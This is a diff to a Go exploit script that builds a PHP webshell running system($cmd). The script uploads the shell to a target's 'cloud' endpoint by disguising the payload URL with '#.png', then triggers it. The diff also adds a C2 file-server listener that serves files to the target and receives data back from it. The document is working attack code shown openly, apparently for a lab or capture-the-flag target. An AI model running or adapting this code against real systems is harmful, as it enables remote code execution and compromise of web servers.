@@ -13,8 +13,11 @@ import (
 	"os"
 	"regexp"
 	"strings"
+	"sync"
 	"time"
 )
+
+var SRV http.Server
 
 var ANSI_CLRLN string = "\r\x1b[2K\r"
 var ANSI_CLRSC string = "\x1b[2J\x1b[H"
@@ -64,7 +67,7 @@ func (c *Client) BuildWebshell(c2addr string) (err error) {
 	webshellcontent = fmt.Sprintf("%ssystem($cmd);\n", webshellcontent)
 	webshellcontent = fmt.Sprintf("%s?>", webshellcontent)
 
-	fptr, err = os.OpenFile(c.Webshellname, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0744)
+	fptr, err = os.OpenFile(c.Webshellname, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
 	if err != nil {
 		return err
 	}
@@ -174,7 +177,7 @@ func (c *Client) TriggerShell() (err error) {
 	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)
 
 	SysMsgNB("waiting for upload ...")
-	time.Sleep(5)
+	time.Sleep(3 * time.Second)
 
 	req, err = http.NewRequest(http.MethodGet, targeturl, nil)
 	if err != nil {
@@ -239,21 +242,16 @@ func (c *Client) UploadWebshell(c2addr string) (err error) {
 	var resp *http.Response
 	var targetroute string = "cloud"
 	var targeturl string = fmt.Sprintf("%s/%s/", c.baseURL, targetroute)
-	var uploadname string
 
-	uploadname, err = GenRandomName(4, 9)
-	if err != nil {
-		return err
-	}
-	uploadname = fmt.Sprintf("%s.php", uploadname)
-
-	err = c.BuildWebshell(c2addr)
+	err = c.BuildWebshell(fmt.Sprintf("%s/%s", c2addr, c.Shellfile))
 	if err != nil {
 		return err
 	}
 
 	payload = fmt.Sprintf("%s/%s#.png", c2addr, c.Webshellname)
 	postdata.Set("url", payload)
+
+	InfMsg(fmt.Sprintf("target url: %s", payload))
 
 	req, err = http.NewRequest(http.MethodPost, targeturl, strings.NewReader(postdata.Encode()))
 	if err != nil {
@@ -555,6 +553,53 @@ func GrabIPs(targetIface string) (ipList []net.IP, err error) {
 	return ipList, nil
 }
 
+//
+// Function Name: StartListener
+//
+// Author: Thomas Osgood
+//
+// Description:
+//
+//    Function designed to create an HTTP server to use during
+//    this attack. It can deliver files to the target and decode
+//    data coming from the target.
+//
+// Input(s):
+//
+//    ip - string. ip address to listen on.
+//    port - int. port to listen on.
+//    wg - *sync.WaitGroup. waitgroup this is a part of.
+//
+// Return(s):
+//
+//    err - error. error or nil.
+//
+func StartListener(ip string, port int, wg *sync.WaitGroup) (err error) {
+	if wg != nil {
+		defer wg.Done()
+	}
+
+	SRV = http.Server{Addr: fmt.Sprintf("%s:%d", ip, port)}
+
+	var currentDir string
+	var fs http.Handler
+
+	currentDir, err = os.Getwd()
+
+	fs = http.FileServer(http.Dir(currentDir))
+
+	http.Handle("/", http.StripPrefix("/", fs))
+
+	SucMsg(fmt.Sprintf("fileserver being hosted at %s:%d", ip, port))
+	if err = SRV.ListenAndServe(); err != http.ErrServerClosed {
+		ErrMsg(err.Error())
+		return err
+	}
+	SucMsg("server successfully shutdown")
+
+	return nil
+}
+
 func init() {
 	return
 }
@@ -681,6 +726,13 @@ func main() {
 	if err != nil {
 		ErrMsg(err.Error())
 		os.Exit(1)
+	}
+
+	// C2 address specified. start fileserver.
+	if len(c2ip) > 0 {
+		go StartListener(c2ip, c2p, nil)
+		time.Sleep(250 * time.Millisecond)
+		defer SRV.Close()
 	}
 
 	//============================================================
